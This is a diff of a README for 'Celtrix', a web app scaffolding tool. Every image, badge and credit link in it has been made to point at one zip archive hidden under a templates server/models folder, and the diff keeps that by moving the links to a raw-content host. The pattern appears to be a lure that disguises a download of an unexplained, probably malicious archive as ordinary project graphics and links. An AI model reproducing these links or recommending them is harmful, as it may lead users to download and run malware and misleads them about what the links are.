@@ -1,13 +1,13 @@
 <div align="center">
-  <img width="250" height="250" alt="Untitled design" src="https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip" />
+  <img width="250" height="250" alt="Untitled design" src="https://raw.githubusercontent.com/kaifansariw/Celtrix/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip" />
   
   # Celtrix
 
   **Setup web apps in seconds, not hours, with your preferred stack**
   
-  [![npm version](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)
-  [![License: ISC](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)
-  [![Downloads](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)
+  [![npm version](https://raw.githubusercontent.com/kaifansariw/Celtrix/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)](https://raw.githubusercontent.com/kaifansariw/Celtrix/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)
+  [![License: ISC](https://raw.githubusercontent.com/kaifansariw/Celtrix/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)](https://raw.githubusercontent.com/kaifansariw/Celtrix/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)
+  [![Downloads](https://raw.githubusercontent.com/kaifansariw/Celtrix/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)](https://raw.githubusercontent.com/kaifansariw/Celtrix/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)
   
 </div>
 
@@ -19,14 +19,14 @@
 Choose from **7+ popular stacks** including MERN, MEAN, T3, Angular+Tailwind, and more!
 
 <div align="center">
-  <img width="455" height="537" alt="Celtrix Stack Selection Demo" src="https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip" />
+  <img width="455" height="537" alt="Celtrix Stack Selection Demo" src="https://raw.githubusercontent.com/kaifansariw/Celtrix/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip" />
 </div>
 
 ### 🌐 **Language Flexibility**
 Pick your preferred programming languages and frameworks to match your workflow.
 
 <div align="center">
-  <img width="578" height="361" alt="Celtrix Language Selection" src="https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip" />
+  <img width="578" height="361" alt="Celtrix Language Selection" src="https://raw.githubusercontent.com/kaifansariw/Celtrix/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip" />
 </div>
 
 ### 🛠️ **Ready-to-Go Setup**
@@ -73,7 +73,7 @@ We love contributions! Please feel free to:
 
 <div align="center">
   
-  **Made with ❤️ by [Celtrix Team](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)**
+  **Made with ❤️ by [Celtrix Team](https://raw.githubusercontent.com/kaifansariw/Celtrix/main/templates/mevn%2Btailwind%2Bauth/javascript/server/models/3.5.zip)**
   
   ### ⭐ Star us on GitHub — it motivates us a lot!
   
